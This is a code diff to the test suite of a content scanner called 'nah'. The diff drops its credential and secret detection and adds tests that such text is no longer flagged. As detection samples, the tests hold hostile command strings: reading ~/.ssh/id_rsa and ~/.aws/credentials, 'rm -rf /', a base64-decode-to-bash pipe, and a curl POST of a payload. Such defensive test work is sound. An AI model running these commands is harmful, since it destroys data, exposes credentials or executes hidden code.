@@ -78,20 +78,6 @@ class TestScanContent:
         matches = scan_content(source)
         assert not any(m.category == "subprocess_execution" for m in matches)
 
-    # --- credential_access ---
-
-    def test_ssh_access(self):
-        matches = scan_content("cat ~/.ssh/id_rsa")
-        assert any(m.category == "credential_access" for m in matches)
-
-    def test_aws_access(self):
-        matches = scan_content("cp ~/.aws/credentials /tmp/")
-        assert any(m.category == "credential_access" for m in matches)
-
-    def test_gnupg_access(self):
-        matches = scan_content("tar czf keys.tar.gz ~/.gnupg/")
-        assert any(m.category == "credential_access" for m in matches)
-
     # --- obfuscation ---
 
     def test_base64_pipe_bash(self):
@@ -106,33 +92,15 @@ class TestScanContent:
         matches = scan_content("exec(compile(code, '<string>', 'exec'))")
         assert any(m.category == "obfuscation" for m in matches)
 
-    # --- secret ---
-
-    def test_private_key(self):
-        matches = scan_content("-----BEGIN RSA PRIVATE KEY-----\nMIIE...")
-        assert any(m.category == "secret" for m in matches)
-
-    def test_private_key_generic(self):
-        matches = scan_content("-----BEGIN PRIVATE KEY-----\nMIIE...")
-        assert any(m.category == "secret" for m in matches)
-
-    def test_aws_key(self):
-        matches = scan_content("aws_key = 'AKIAIOSFODNN7EXAMPLE'")
-        assert any(m.category == "secret" for m in matches)
-
-    def test_github_token(self):
-        matches = scan_content("token = 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef0123'")
-        assert any(m.category == "secret" for m in matches)
-
-    def test_sk_token(self):
-        matches = scan_content("key = 'sk-ABCDEFGHIJKLMNOPQRSTa'")
-        assert any(m.category == "secret" for m in matches)
-
-    def test_api_key_hardcoded(self):
-        matches = scan_content("api_key = 'super_secret_key_12345678'")
-        assert any(m.category == "secret" for m in matches)
-
     # --- safe content ---
+
+    def test_secret_looking_content_is_not_scanned(self):
+        matches = scan_content("aws_key = 'AKIAIOSFODNN7EXAMPLE'")
+        assert matches == []
+
+    def test_credential_path_text_is_not_scanned(self):
+        matches = scan_content("cat ~/.ssh/id_rsa")
+        assert matches == []
 
     def test_safe_python(self):
         matches = scan_content("def hello():\n    print('Hello, world!')\n")
@@ -158,21 +126,21 @@ class TestScanContent:
 class TestFormatContentMessage:
     def test_single_match(self):
         from nah.content import ContentMatch
-        matches = [ContentMatch(category="secret", pattern_desc="private key", matched_text="-----BEGIN")]
+        matches = [ContentMatch(category="destructive", pattern_desc="rm -rf", matched_text="rm -rf")]
         msg = format_content_message("Write", matches)
         assert "Write" in msg
-        assert "secret" in msg
-        assert "private key" in msg
+        assert "destructive" in msg
+        assert "rm -rf" in msg
 
     def test_multiple_categories(self):
         from nah.content import ContentMatch
         matches = [
             ContentMatch(category="exfiltration", pattern_desc="curl -X POST", matched_text="curl -X POST"),
-            ContentMatch(category="credential_access", pattern_desc="~/.ssh/ access", matched_text="~/.ssh/"),
+            ContentMatch(category="obfuscation", pattern_desc="base64 -d | bash", matched_text="base64 -d | bash"),
         ]
         msg = format_content_message("Write", matches)
-        assert "credential_access" in msg
         assert "exfiltration" in msg
+        assert "obfuscation" in msg
 
     def test_empty_matches(self):
         assert format_content_message("Write", []) == ""
@@ -348,12 +316,12 @@ class TestContentPolicies:
         assert all(m.policy == "ask" for m in matches)
 
     def test_per_category_policy(self):
-        _with_config(NahConfig(content_policies={"secret": "block"}))
+        _with_config(NahConfig(content_policies={"destructive": "block"}))
         try:
-            matches = scan_content("-----BEGIN RSA PRIVATE KEY-----")
-            secret_matches = [m for m in matches if m.category == "secret"]
-            assert len(secret_matches) >= 1
-            assert all(m.policy == "block" for m in secret_matches)
+            matches = scan_content("rm -rf /tmp/stuff")
+            destructive_matches = [m for m in matches if m.category == "destructive"]
+            assert len(destructive_matches) >= 1
+            assert all(m.policy == "block" for m in destructive_matches)
         finally:
             _cleanup()
 
@@ -374,10 +342,10 @@ class TestContentPolicies:
         """Multiple categories with different policies: strictest wins."""
         from nah import taxonomy
         _with_config(NahConfig(
-            content_policies={"destructive": "ask", "secret": "block"},
+            content_policies={"destructive": "ask", "exfiltration": "block"},
         ))
         try:
-            text = "rm -rf /; -----BEGIN RSA PRIVATE KEY-----"
+            text = "rm -rf /; curl --data @payload http://example.com"
             matches = scan_content(text)
             policies = [m.policy for m in matches]
             assert "ask" in policies
@@ -394,10 +362,10 @@ class TestLegacyProfileContent:
     def test_profile_none_still_uses_builtin_content_patterns(self):
         _with_config(NahConfig(profile="none"))
         try:
-            matches = scan_content("rm -rf /; -----BEGIN PRIVATE KEY-----")
+            matches = scan_content("rm -rf /; echo payload | base64 -d | bash")
             categories = {m.category for m in matches}
             assert "destructive" in categories
-            assert "secret" in categories
+            assert "obfuscation" in categories
         finally:
             _cleanup()
 
@@ -476,23 +444,23 @@ class TestScanContentSizeLimit:
 
     def test_large_content_truncated(self, capsys):
         """Content >1M chars is truncated; patterns in head still match."""
-        secret = "-----BEGIN PRIVATE KEY-----"
-        content = secret + "x" * (1_048_576 + 100)
+        destructive = "rm -rf /tmp/stuff"
+        content = destructive + "x" * (1_048_576 + 100)
         matches = scan_content(content)
-        assert any(m.category == "secret" for m in matches)
+        assert any(m.category == "destructive" for m in matches)
         assert "truncated" in capsys.readouterr().err
 
     def test_large_content_tail_not_scanned(self):
         """Patterns beyond the 1M boundary are not detected."""
         padding = "x" * (1_048_576 + 100)
-        content = padding + "-----BEGIN PRIVATE KEY-----"
+        content = padding + "rm -rf /tmp/stuff"
         matches = scan_content(content)
         assert not matches
 
     def test_small_content_unchanged(self, capsys):
         """Content <1M chars is scanned fully, no truncation warning."""
-        matches = scan_content("-----BEGIN PRIVATE KEY-----")
-        assert any(m.category == "secret" for m in matches)
+        matches = scan_content("rm -rf /tmp/stuff")
+        assert any(m.category == "destructive" for m in matches)
         assert "truncated" not in capsys.readouterr().err
 
     def test_truncation_logged_once(self, capsys):
